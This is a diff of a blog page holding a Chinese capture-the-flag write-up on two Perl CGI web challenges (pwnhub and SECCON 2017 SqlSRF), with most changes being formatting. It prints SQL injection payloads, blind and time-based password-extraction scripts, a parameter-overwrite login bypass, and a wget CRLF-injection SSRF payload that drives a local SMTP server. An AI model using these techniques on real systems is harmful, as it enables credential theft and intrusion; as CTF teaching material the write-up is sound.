@@ -20,13 +20,13 @@
     <meta name="keywords" content="LOnils,security,rootkit">
     
     <meta name="description" content="">
-    <meta name="description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/怕题目下线了把源码先cp下来。1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE userna">
+    <meta name="description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/ 怕题目下线了把源码先cp下来。 1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE user">
 <meta name="keywords" content="CTF,Perl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwnhub returns and SqlSRF WP">
 <meta property="og:url" content="http://onils.github.io/2017/12/17/Pwnhub-returns-and-SqlSRF-WP/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/怕题目下线了把源码先cp下来。1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE userna">
+<meta property="og:description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/ 怕题目下线了把源码先cp下来。 1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE user">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://onils.github.io/images/15134867005561.jpg">
 <meta property="og:image" content="http://onils.github.io/images/15133497303968.jpg">
@@ -37,10 +37,10 @@
 <meta property="og:image" content="http://onils.github.io/images/15134962121346.jpg">
 <meta property="og:image" content="http://onils.github.io/images/15134964001814.jpg">
 <meta property="og:image" content="http://onils.github.io/images/15134970632235.jpg">
-<meta property="og:updated_time" content="2020-05-03T18:41:29.699Z">
+<meta property="og:updated_time" content="2020-06-02T11:05:36.876Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwnhub returns and SqlSRF WP">
-<meta name="twitter:description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/怕题目下线了把源码先cp下来。1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE userna">
+<meta name="twitter:description" content="最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。 0x01 Pwbhub归来题目地址：http://54.222.248.100/ 怕题目下线了把源码先cp下来。 1my $sth = $dbh-&amp;gt;prepare(&quot;SELECT password FROM users WHERE user">
 <meta name="twitter:image" content="http://onils.github.io/images/15134867005561.jpg">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -427,35 +427,52 @@ height:40vh;
             <main class="main post-page">
     <article class="article-entry">
         <p>最近pwnhub出了个perl的Web题，查看源码title的时候顺便发现了SECCON2017的SqlSRF，也顺便也研究了下perl语言的一些特性。</p>
-<h2 id="0x01-Pwbhub归来"><a href="#0x01-Pwbhub归来" class="headerlink" title="0x01 Pwbhub归来"></a>0x01 Pwbhub归来</h2><p><code>题目地址：http://54.222.248.100/</code><br>怕题目下线了把<a href="https://github.com/Onils/blogfile/blob/master/pwbhub-return-index.cgi.bak" target="_blank" rel="noopener">源码</a>先cp下来。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT password FROM users WHERE username='"</span>.$q-&gt;param(<span class="string">'user'</span>).<span class="string">"';"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>user处很明显的sqli,撸个测试脚本注入下（最早之前是用延时注入脚本跑的，和0x2 SqlSRF里的脚本差不多）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://54.222.248.100/cgi-bin/'</span></span><br><span class="line">dic=<span class="string">'abcdef0123456789'</span></span><br><span class="line">password=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">"' or password like '&#123;&#125;%' union select 'f561aaf6ef0bf14d4208bb46a4ccb3ad"</span></span><br><span class="line">		payload=payload.format(password+j)</span><br><span class="line">		data=&#123;</span><br><span class="line">			<span class="string">"user"</span>:payload,</span><br><span class="line">			<span class="string">"pass"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">			<span class="string">"login"</span>:<span class="string">"Login"</span></span><br><span class="line">		&#125;</span><br><span class="line">		res=requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">			password+=j</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/15134867005561.jpg" alt=""><br>得到<code>63730edfab254f34761c17e89de28086</code><br>扔到各种解md5处都解不出来..<br>过了下代码，如果解出来了这题就直接pass了，不就变得太容易了…<br>所以老老实实看perl（强行看懂）。。。</p>
-<p>我们先看第一个判断：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$md5-&gt;add($q-&gt;param(<span class="string">'pass'</span>));</span><br><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>] <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $q-&gt;param(<span class="string">'pass'</span>) <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $row[<span class="number">0</span>] eq $md5-&gt;clone-&gt;hexdigest) &#123;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><code>$q-&gt;param(&#39;pass&#39;)</code> 这个是我们输入可控字段咋样都好说，<code>$row[0]</code> 的值我们可以 <code>union select &#39;XXXX&#39; --</code> 这样控制。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&apos;+union+select+&apos;47bce5c74f589f4867dbd57e9ca9f808&apos;+--&amp;pass=aaa&amp;login=Login</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-Pwbhub归来"><a href="#0x01-Pwbhub归来" class="headerlink" title="0x01 Pwbhub归来"></a>0x01 Pwbhub归来</h2><p><code>题目地址：http://54.222.248.100/</code></p>
+<p>怕题目下线了把<a href="https://github.com/Onils/blogfile/blob/master/pwbhub-return-index.cgi.bak" target="_blank" rel="noopener">源码</a>先cp下来。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT password FROM users WHERE username='"</span>.$q-&gt;param(<span class="string">'user'</span>).<span class="string">"';"</span>);</span><br></pre></td></tr></table></figure>
+<p>user处很明显的sqli,撸个测试脚本注入下（最早之前是用延时注入脚本跑的，和0x2 SqlSRF里的脚本差不多）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://54.222.248.100/cgi-bin/'</span></span><br><span class="line">dic=<span class="string">'abcdef0123456789'</span></span><br><span class="line">password=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">    payload=<span class="string">"' or password like '&#123;&#125;%' union select 'f561aaf6ef0bf14d4208bb46a4ccb3ad"</span></span><br><span class="line">    payload=payload.format(password+j)</span><br><span class="line">    data=&#123;</span><br><span class="line">      <span class="string">"user"</span>:payload,</span><br><span class="line">      <span class="string">"pass"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">      <span class="string">"login"</span>:<span class="string">"Login"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">      password+=j</span><br><span class="line">      <span class="keyword">print</span> password</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/15134867005561.jpg" alt=""></p>
+<p>得到<code>63730edfab254f34761c17e89de28086</code>，扔到各种解md5处都解不出来..   过了下代码，如果解出来了这题就直接pass了，不就变得太容易了…</p>
+<p>所以老老实实看perl（强行看懂），我们先看第一个判断：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$md5-&gt;add($q-&gt;param(<span class="string">'pass'</span>));</span><br><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>] <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $q-&gt;param(<span class="string">'pass'</span>) <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $row[<span class="number">0</span>] eq $md5-&gt;clone-&gt;hexdigest) &#123;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$q-&gt;param(&#39;pass&#39;)</code> 这个是我们输入可控字段咋样都好说，<code>$row[0]</code> 的值我们可以 <code>union select &#39;XXXX&#39; --</code> 这样控制。  </p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&apos;+union+select+&apos;47bce5c74f589f4867dbd57e9ca9f808&apos;+--&amp;pass=aaa&amp;login=Login</span><br></pre></td></tr></table></figure>
 <p>进入第一个if判断。。<br><img src="/images/15133497303968.jpg" alt=""></p>
 <p>再来看第二个判断<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$s-&gt;param(<span class="string">'autheduser'</span>, $q-&gt;param(<span class="string">'user'</span>));</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;p style='color: #FFF'&gt;YOU ARE "</span> . $s-&gt;param(<span class="string">'autheduser'</span>) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($s-&gt;param(<span class="string">'autheduser'</span>) eq <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"FLAG&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>很明显要让autheduser里的值为admin，这里就考到perl的“特性”<br>一图解千言<br><img src="/images/15133498016980.jpg" alt=""><br>对，变量覆盖<br>最终payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&apos;+union+select+&apos;47bce5c74f589f4867dbd57e9ca9f808&apos;+--&amp;user=autheduser&amp;user=admin&amp;pass=aaa&amp;login=Login</span><br></pre></td></tr></table></figure></p>
+<p>很明显要让autheduser里的值为admin，这里就考到perl的“特性”   ，一图解千言<br><img src="/images/15133498016980.jpg" alt=""></p>
+<p>对，变量覆盖，最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&apos;+union+select+&apos;47bce5c74f589f4867dbd57e9ca9f808&apos;+--&amp;user=autheduser&amp;user=admin&amp;pass=aaa&amp;login=Login</span><br></pre></td></tr></table></figure>
 <p><img src="/images/15134997464059.jpg" alt=""></p>
-<h2 id="0x02-SECCON-2017-Web-SqlSRF"><a href="#0x02-SECCON-2017-Web-SqlSRF" class="headerlink" title="0x02 SECCON 2017 Web SqlSRF"></a>0x02 SECCON 2017 Web SqlSRF</h2><p><code>题目地址：http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi</code><br><a href="https://github.com/Onils/blogfile/blob/master/seccon-2017-sqlsrf.index.cgi_backup20171129" target="_blank" rel="noopener">源码</a><br>pwnhub把这题改了部分，变成另一题，这题其实也不错，名字取得真好~<br>SQL语句和之前一样，在判断这边<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">my</span> @row = $sth-&gt;fetchrow_array) &#123;</span><br><span class="line">      <span class="keyword">if</span>($row[<span class="number">0</span>] <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $q-&gt;param(<span class="string">'pass'</span>) <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $row[<span class="number">0</span>] eq &amp;encrypt($q-&gt;param(<span class="string">'pass'</span>))) &#123;</span><br><span class="line">        $s-&gt;param(<span class="string">'autheduser'</span>, $q-&gt;param(<span class="string">'user'</span>));</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;scr"</span>.<span class="string">"ipt&gt;document.location='./menu.cgi';&lt;/script&gt;"</span>;</span><br><span class="line">        $errmsg = <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-SECCON-2017-Web-SqlSRF"><a href="#0x02-SECCON-2017-Web-SqlSRF" class="headerlink" title="0x02 SECCON 2017 Web SqlSRF"></a>0x02 SECCON 2017 Web SqlSRF</h2><p><code>题目地址：http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi</code>   </p>
+<p><a href="https://github.com/Onils/blogfile/blob/master/seccon-2017-sqlsrf.index.cgi_backup20171129" target="_blank" rel="noopener">源码</a></p>
+<p>pwnhub把这题改了部分，变成另一题，这题其实也不错，名字取得真好~  SQL语句和之前一样，在判断这边  </p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">my</span> @row = $sth-&gt;fetchrow_array) &#123;</span><br><span class="line">      <span class="keyword">if</span>($row[<span class="number">0</span>] <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $q-&gt;param(<span class="string">'pass'</span>) <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $row[<span class="number">0</span>] eq &amp;encrypt($q-&gt;param(<span class="string">'pass'</span>))) &#123;</span><br><span class="line">        $s-&gt;param(<span class="string">'autheduser'</span>, $q-&gt;param(<span class="string">'user'</span>));</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;scr"</span>.<span class="string">"ipt&gt;document.location='./menu.cgi';&lt;/script&gt;"</span>;</span><br><span class="line">        $errmsg = <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
 <p>encrypt函数应该是在<code>require &#39;./.htcrypt.pl&#39;;</code> 里，无法访问。不过在cookie里可以发现有这一行<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">-cookie=&gt;</span></span><br><span class="line">  [</span><br><span class="line">    $q-&gt;cookie(<span class="string">-name=&gt;</span><span class="string">'CGISESSID'</span>, <span class="string">-value=&gt;</span>$s-&gt;id),</span><br><span class="line">    ($q-&gt;param(<span class="string">'save'</span>) eq <span class="string">'1'</span> ? $q-&gt;cookie(<span class="string">-name=&gt;</span><span class="string">'remember'</span>, <span class="string">-value=&gt;</span>&amp;encrypt($user), <span class="string">-expires=&gt;</span><span class="string">'+1M'</span>) : <span class="keyword">undef</span>)</span><br><span class="line">  ])</span><br></pre></td></tr></table></figure></p>
-<p>save=1的时候，返回encrypt($user)</p>
-<p>所以在user里输入admin 返回了</p>
+<p>save=1的时候，返回encrypt($user)，所以在user里输入admin 返回了</p>
 <p><img src="/images/15134951135139.jpg" alt=""></p>
-<p>之后<br>username:’union select ‘58474452dda5c2bdc1f6869ace2ae9e3<br>password:admin</p>
+<p>之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:&apos;union select &apos;58474452dda5c2bdc1f6869ace2ae9e3</span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure>
 <p>即可进入menu.cgi<br><img src="/images/15134952238870.jpg" alt=""></p>
-<p>不过貌似权限不高，还是得注入出admin的密码才行。<br>延时注入脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">"http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"</span></span><br><span class="line">    data = &#123;<span class="string">"user"</span>:payload,<span class="string">"pass"</span>:<span class="string">"admin"</span>,<span class="string">"login"</span>:<span class="string">"Login"</span>,<span class="string">"save"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">    s = time()</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    e = time()</span><br><span class="line">    <span class="keyword">if</span> e-s &gt; <span class="number">3.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    payload = <span class="string">"admin' and password like '"</span></span><br><span class="line">    payload1 = <span class="string">"%' and 1=randomblob(600000000)--"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"abcdef0123456789"</span>:</span><br><span class="line">        payload_send = payload + password + i + payload1</span><br><span class="line">        flag = send_payload(payload_send)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="keyword">True</span>:</span><br><span class="line">            password+=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    <span class="keyword">if</span> len(password) == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>得到一串神秘代码~<br>（d2f37e101c0e76bcc90b5634a5510f64）</p>
+<p>不过貌似权限不高，还是得注入出admin的密码才行。</p>
+<p>延时注入脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">"http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"</span></span><br><span class="line">    data = &#123;<span class="string">"user"</span>:payload,<span class="string">"pass"</span>:<span class="string">"admin"</span>,<span class="string">"login"</span>:<span class="string">"Login"</span>,<span class="string">"save"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">    s = time()</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    e = time()</span><br><span class="line">    <span class="keyword">if</span> e-s &gt; <span class="number">3.0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    payload = <span class="string">"admin' and password like '"</span></span><br><span class="line">    payload1 = <span class="string">"%' and 1=randomblob(600000000)--"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"abcdef0123456789"</span>:</span><br><span class="line">        payload_send = payload + password + i + payload1</span><br><span class="line">        flag = send_payload(payload_send)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="keyword">True</span>:</span><br><span class="line">            password+=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br><span class="line">    <span class="keyword">if</span> len(password) == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>得到一串神秘代码~（d2f37e101c0e76bcc90b5634a5510f64）</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user = &amp;decrypt($q-&gt;cookie(<span class="string">'remember'</span>)) <span class="keyword">if</span>($user eq <span class="string">''</span> &amp;&amp; $q-&gt;cookie(<span class="string">'remember'</span>) <span class="keyword">ne</span> <span class="string">''</span>);</span><br></pre></td></tr></table></figure>
 <p>需要解密?直接扔到cookie rember去</p>
 <p><img src="/images/15134962121346.jpg" alt=""></p>
 <p>得到密码后直接登录</p>
 <p><img src="/images/15134964001814.jpg" alt=""></p>
-<p>登录后 通过netstat 可以看到本地25端口(SMTP)开放，2处有wget，命令后面可控，SSRF。wget 有个CRLF<br><a href="https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html" target="_blank" rel="noopener">Vulnerability Report - CRLF Injection in Wget Host Part</a><br><code>%0a%0d</code>即可任意执行（这脑回路反正我是没想到，应该比赛的时候有tips吧）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">HELO admin</span><br><span class="line">MAIL FROM:&lt;myemail@gmail.com&gt;</span><br><span class="line">RCPT TO:&lt;root@ymzk01.pwn&gt;</span><br><span class="line">DATA</span><br><span class="line">From:myemail@gmail.com</span><br><span class="line">To:root@ymzk01.pwn</span><br><span class="line">Subject:give me flag</span><br><span class="line">give me flag</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:25/</span><br></pre></td></tr></table></figure></p>
+<p>登录后 通过netstat 可以看到本地25端口(SMTP)开放，2处有wget，命令后面可控，SSRF。wget 有个CRLF</p>
+<p><a href="https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html" target="_blank" rel="noopener">Vulnerability Report - CRLF Injection in Wget Host Part</a></p>
+<p><code>%0a%0d</code>即可任意执行（这脑回路反正我是没想到，应该比赛的时候有tips吧）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">HELO admin</span><br><span class="line">MAIL FROM:&lt;myemail@gmail.com&gt;</span><br><span class="line">RCPT TO:&lt;root@ymzk01.pwn&gt;</span><br><span class="line">DATA</span><br><span class="line">From:myemail@gmail.com</span><br><span class="line">To:root@ymzk01.pwn</span><br><span class="line">Subject:give me flag</span><br><span class="line">give me flag</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:25/</span><br></pre></td></tr></table></figure>
 <p>email 改成自己邮箱即可收到</p>
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0D%0AHELO%20admin%0D%0AMAIL%20FROM%3A%3Cmyemail%40gmail.com%3E%0D%0ARCPT%20TO%3A%3Croot%40ymzk01.pwn%3E%0D%0ADATA%0D%0AFrom%3Amyemail%40gmail.com%0D%0ATo%3Aroot%40ymzk01.pwn%0D%0ASubject%3Agive%20me%20flag%0D%0Agive%20me%20flag%0D%0A.%0D%0AQUIT%0D%0A%:25/</span><br></pre></td></tr></table></figure></p>
 <p>再次解密即可<br><img src="/images/15134970632235.jpg" alt=""></p>
 <p>也可以利用万能的py，顺便复习下bs4<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password_decrypted</span><span class="params">(password)</span>:</span></span><br><span class="line">    url = <span class="string">"http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"</span></span><br><span class="line">    data = &#123;<span class="string">"user"</span>:<span class="string">""</span>,<span class="string">"pass"</span>:<span class="string">"test"</span>,<span class="string">"login"</span>:<span class="string">"Login"</span>&#125;</span><br><span class="line">    cookie = &#123;<span class="string">'remember'</span>: password&#125;</span><br><span class="line">    r = requests.post(url, data=data,cookies=cookie)</span><br><span class="line">    html_bytes = r.text</span><br><span class="line">    soup = bs4(html_bytes, <span class="string">'lxml'</span>)</span><br><span class="line">    password_dec = soup.find(<span class="string">'input'</span>, &#123;<span class="string">'name'</span>:<span class="string">'user'</span>&#125;)[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> password_dec</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-Perl-Security"><a href="#0x03-Perl-Security" class="headerlink" title="0x03 Perl Security"></a>0x03 Perl Security</h2><p><a href="https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf" target="_blank" rel="noopener">[1] The Perl Jam</a><br><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">[2] The Perl Jam 2</a></p>
+<h2 id="0x03-Perl-Security"><a href="#0x03-Perl-Security" class="headerlink" title="0x03 Perl Security"></a>0x03 Perl Security</h2><p><a href="https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf" target="_blank" rel="noopener">[1] The Perl Jam</a></p>
+<p><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">[2] The Perl Jam 2</a></p>
